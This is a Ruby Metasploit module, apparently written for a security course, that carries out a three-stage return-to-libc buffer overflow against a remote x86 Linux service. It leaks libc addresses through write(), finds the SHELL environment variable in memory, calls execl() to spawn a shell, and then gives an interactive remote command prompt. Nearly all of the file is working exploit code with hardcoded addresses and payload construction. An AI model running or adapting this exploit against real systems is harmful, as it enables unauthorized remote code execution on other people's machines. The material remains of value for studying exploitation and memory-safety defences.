##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# 
# Usage: Place in <metasploit directory>/modules/auxiliary/
# Then run ./msfconsole
# use auxiliary/extra_credit
#
# This metasploit module is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This software is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this metasploit module. If not, see <http://www.gnu.org/licenses/>.
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
      
  def initialize
    super(
      'Name'         => 'Remote TCP return-to-libc buffer overflow attack resulting in a remote shell.',
      'Description'  => "This module exploits a stack based buffer overflow on a remote server (x86_64 Linux) with ASLR (Address Space Layout Randomization) and NX (Non-executable stack) enabled in order to spawn a remote shell. 
    The exploit functions by finding the addresses of C library functions from the GOT by using the write() library function as long as it is in the vulnerable program's PLT. (This exploit is possible as long as the target application calls the write() library function and contains a buffer overflow vulnerability.)
    Then a remote shell is executed using the systems SHELL environment variable.
    You may need to manually specify the write()'s PLT and GOT addresses in the vulnerable program, and the addresses of write() and execl() in libc. These can be found from disassembling the vulnerable application's binary, and from disassembling the corresponding version of libc-x.x.so.
    By default this module uses the addresses found from my local testing on a vulnerable application. (The provided libc.so and exploitlab binaries.)",# To function, the address of write() must be known in the vulnerable program's PLT and GOT. The address of write() and execl() must also be known in the corresponding version of libc.
      'Author'       => 'Nicholas Lochner <njlochner@gmail.com>',
      'License'      => 'GNU General Public License v3.0',
      'References'   =>
        [ 
          [ 'URL', 'https://css.csail.mit.edu/6.858/2012/readings/return-to-libc.pdf'],
          [ 'URL', 'http://en.wikipedia.org/wiki/Return-to-libc_attack'],
          [ 'URL', 'http://www.cis.syr.edu/~wedu/Teaching/CompSec/LectureNotes_New/Buffer_Overflow.pdf'] #http://media.blackhat.com/bh-us-10/whitepapers/Le/BlackHat-USA-2010-Le-Paper-Payload-already-inside-data-reuse-for-ROP-exploits-wp.pdf
        ]
    )
    register_options(
        [
          #OptString.new('HOSTNAME', [true, "The hostname/IP address of the remote target machine."]),
          #OptString.new('PORT', [true, "The port of the listening vulnerable application."]),
          OptString.new('write_libc_address', [false, "Optionally manually specify. Will use 0x000d9510 if not specified."]),
          OptString.new('execl_libc_address', [false, "Optionally manually specify. Will use 0x000b4da0 if not specified."]),
          OptString.new('write_PLT_address', [false, "Optionally manually specify. Will use 0x0804830c if not specified."]),
          OptString.new('write_GOT_address', [false, "Optionally manually specify. Will use 0x08049614 if not specified."]),
          OptString.new('environment_variables_address', [false, "The address to dump data from in attempt to find the SHELL environment variable. Will use 0xffffd000 if not specified."]),
          OptString.new('buffer_length', [false, "Buffer length to return address. Will use 140 if not specified."]),
          OptString.new('stage', [false, "The stage of the exploit to run at options: 1, 2, 3. (Uses 1 by default)\nIf 2 is specified, you must specify the address of execl() in the vulnerable program.\nIf 3 is specified you must specify the address of execl() and the SHELL environment variable."]),
          OptString.new('execl_program_address', [false, "Manually specify if starting at stage 2 or 3."]),
          OptString.new('SHELL_address', [false, "(String of SHELL environment variable value. i.e. \"/bin/bash\") Manually specify if starting at stage 3."]),
          OptString.new('exit_immediately', [false, "Exit immediately after spawning the shell."]),
          #OptString.new('use_system', [false, "Use system() instead of execl to spawn the remote shell."]),
          #@Todo implement: OptString.new('clean_exit', [false, "Use the libc exit() call once the address is discovered for a cleaner exit."]),
        ], self.class)
  end
  
  # Converts sock.get data to hex string
  def socket_data_to_hex_s(data)
    data = data.unpack('C*').map {|e| e.to_s 16}
    s = ""
    data.reverse_each do |j|
      s = s +j.to_s
    end
    return s
  end
  
  # Converts a hex integer to string and adds padding
  def hex_to_s(hex_value)
    s = hex_value.to_s(16)
    while s.length < 8
      s.insert(0, "0")
    end
    return s
  end
  
  # Converts a hex-encoded string to little-endian
  def to_little_endian(hex_string)
    return hex_string.scan(/(..)(..)(..)(..)/).map(&:reverse).join
  end
    
  def print_success(text)
    puts "\e[32;1m[+]\e[0m #{text}"
  end
  
  def run 
    
    stage = 1
    write_addr_libc = 0x000d9510 #local 0x000d92d0 (Ubuntu GLIBC 2.19-10ubuntu2.3) 2.19
    execl_addr_libc = 0x000b4da0 #local 0x000b4c60
    write_PLT_addr = 0x0804830c
    write_GOT_addr = 0x08049614
    environment_variables_address = 0xffffd000 # guess_addr = "\x00\xd0\xff\xff" #@todo try other addresses if no data is recvd
    buffer_length = 140
    
    ret_addr = "\xEF\xBE\xAD\xDE"#@todo: replace 0xDEADBEEF with exit() if user specifies clean exit
    
    if datastore['write_libc_address']
      write_addr_libc = datastore['write_libc_address'].gsub('0x','').hex #0x000d92d0
    end
      
    if datastore['execl_libc_address']
      execl_addr_libc = datastore['execl_libc_address'].gsub('0x','').hex #0x000b4c60
    end
    
    if datastore['write_PLT_address']
      write_PLT_addr = datastore['write_PLT_address'].gsub('0x','').hex
    end
    
    if datastore['write_GOT_address']
      write_GOT_addr = datastore['write_GOT_address'].gsub('0x','').hex
    end
    
    if datastore['buffer_length']
      buffer_length = datastore['buffer_length'].to_i
    end
    
    if datastore['execl_program_address']
      execl_addr = hex_to_s(datastore['execl_program_address'].gsub('0x','').hex)
    end
    
    if datastore['SHELL_address']
      shell_addr = hex_to_s(datastore['SHELL_address'].gsub('0x','').hex)
    end
    
    if datastore['environment_variables_address']
      environment_variables_address = datastore['environment_variables_address'].gsub('0x','').hex
    end

    exit_immediately = false
    if datastore['exit_immediately']
      exit_immediately = true
    end
    
    if datastore['stage']
      stage = datastore['stage'].to_i
      
      if stage > 1 and not datastore['execl_program_address']
        print_status("Cannot run from stage " + stage.to_s + ", because execl_program_address was not specified. Exiting!")
        return
      end
      
      if stage == 3 and not datastore['SHELL_address']
        print_status("Cannot run from stage " + stage.to_s + ", because SHELL_address was not specified. Exiting!")
        return
      end
        
    end
    
    diff_between_write_and_execl = write_addr_libc - execl_addr_libc #Calculate the difference between write() and execl() in libc.
    
    filler = "A"
    
    write_PLT_addr = hex_to_s(write_PLT_addr)
    write_GOT_addr = hex_to_s(write_GOT_addr)
    
    print_status("Using 0x" + hex_to_s(write_addr_libc) + " as write_libc_address.")
    print_status("Using 0x" + hex_to_s(execl_addr_libc) + " as execl_libc_address.")
    print_status("Using 0x" + write_PLT_addr + " as write_PLT_address.")
    print_status("Using 0x" + write_GOT_addr + " as write_GOT_address.")
    print_status("Using 0x" + hex_to_s(environment_variables_address) + " as environment_variables_address.")
    print_status("Using " + buffer_length.to_s + " as buffer_length.")
    
    #Convert to little-endian strings for exploit code.
    write_PLT_addr = to_little_endian(write_PLT_addr)
    write_GOT_addr = to_little_endian(write_GOT_addr)
    
    print("\n")
    print_status("Running exploit from stage " + stage.to_s + "! If a stage fails, rerun from that stage with 'set stage #' and also set the appropriate required values for that stage. Type 'info' for more information.")
    print_status("Stage 1 and 2 may cause the vulnerable program to segfault, you may need to give the remote application time to restart if stage 2 or 3 fails. The stages may also fail because your specified values are incorrect.")
    print_status("If stage 1 fails you may need to manually specify write_PLT_address, write_GOT_address, write_libc_address, and write_execl_address.")
    
    #Stage 1
    if stage == 1
      #find write address
      print("\n")
      print_status("Stage 1. Finding address of write() from GOT. Then finding the address of execl().")
      
      #Pack buffer with FILLER + address_of_write_in_PLT + return_address + 1 (stdout fd) + address_of_write_in_GOT + 4 (4 bytes to write)
      exploit_buffer = (filler * buffer_length) + [write_PLT_addr].pack('H*') + ret_addr + "\x01\x00\x00\x00" + [write_GOT_addr].pack('H*') + "\x04\x00\x00\x00"
      connect
      sock.put(exploit_buffer) #Send buffer
      write_addr = sock.read(4) #Read data
      
      if not write_addr
        print_error("Failed to find write address. Check your values for write_PLT_address, write_GOT_address, write_libc_address, and write_execl_address.")
        return
      end
      
      addr_string = socket_data_to_hex_s(write_addr) #Convert data to hex string to obtain the address of libc's write() in the vulnerable program.
      print_success("Found write() address: 0x" + addr_string)
      
      execl_addr = hex_to_s((addr_string.hex - diff_between_write_and_execl)) #Compute the address of libc's execl() in the vulnerable program.
      print_status("Difference between write() and execl(): " + diff_between_write_and_execl.to_s)
      print_success("Found execl() address: 0x" + execl_addr)
    end
      
    #Stage 2
    if stage <= 2
      #find SHELL environment variable address
      print("\n")
      print_status("Stage 2. Finding SHELL environment variable.")
      little_endian_environment_variables_address = to_little_endian(hex_to_s(environment_variables_address)) #Convert environment_variables_address to little endian hex string for packing. We did not do this earlier since we still need the hex value to find the SHELL address.
      
      #Pack buffer with FILLER + address_of_write_in_PLT + return_address + 1 (stdout fd) + (address to dump environment variables) + (num bytes to write)
      exploit_buffer = (filler * buffer_length) + [write_PLT_addr].pack('H*') + ret_addr + "\x01\x00\x00\x00" + [little_endian_environment_variables_address].pack('H*') + "\x80\x0f\x00\x00"
      connect
      sock.put(exploit_buffer)
      revd_data = sock.get
      shell_address_offset = revd_data.index('SHELL=') #find index of shell environment variable
      
      if shell_address_offset == nil
         print_error("Failed to find SHELL environment variable address. Try another address to dump by specifying 'environment_variables_address'")
         return
      end
      shell_address_offset += 6 # increment by the length of "SHELL=" to find the index of the shell path. i.e. "/bin/bash/"
      
      print_status("Shell environment variable offset: " + shell_address_offset.to_s)
      
      shell_addr = hex_to_s((environment_variables_address + shell_address_offset)) #Compute address of SHELL
      
      print_success("Found SHELL environment variable address: 0x" + shell_addr)
    end
    
    
    #Stage 3
    #spawn remote shell
    print("\n")
    print_status("Stage 3. Spawning remote shell.")
    execl_addr = to_little_endian(execl_addr) #Convert to little-endian
    shell_addr = to_little_endian(shell_addr) #Convert to little-endian
    
    #Pack buffer with FILLER + address_of_execl + return_address + (address of SHELL environment variable) + (address of SHELL environment variable (argument 0)) + (NULL pointer (argument 1))
    exploit_buffer = (filler * buffer_length) + [execl_addr].pack('H*') + ret_addr + [shell_addr].pack('H*') + [shell_addr].pack('H*') + "\x00\x00\x00\x00"
    
    connect
    sock.put(exploit_buffer)
    
    print_status("Sleeping for 3 seconds to wait for remote shell execution.")
    sleep(3)
    sock.put("pwd \n")
    
    begin
      dir = sock.get_once
    rescue EOFError
      print_error("Remote shell failed to spawn. Your execl_program_address or SHELL_address may be wrong")
      return
    end
    if dir
      print_success("Remote shell spawned successfully! (Ctrl+C to quit)")
      if exit_immediately
        return
      end
      print_status("Working directory: " + dir)
      while true
        print_status("$")
        command = gets
        if command.strip[0..1] == 'cd'
          print_status("'cd' does not work in this remote shell. Specify the full or relative path for commands/programs instead of changing directory.")
        else
          sock.put(command)
          begin
            output = sock.get_once
          rescue EOFError
            print_error("Remote shell connection closed.")
            return
          end
          if output
            print_status(output)
          else
            print_status("Timed out receiving data, returning to prompt if connection is still open. You may need to spawn a new shell by rerunning stage 3 if the prompt is unresponsive. Or hit return a few times and wait for data.")
          end
        end
      end
    end
  end
end
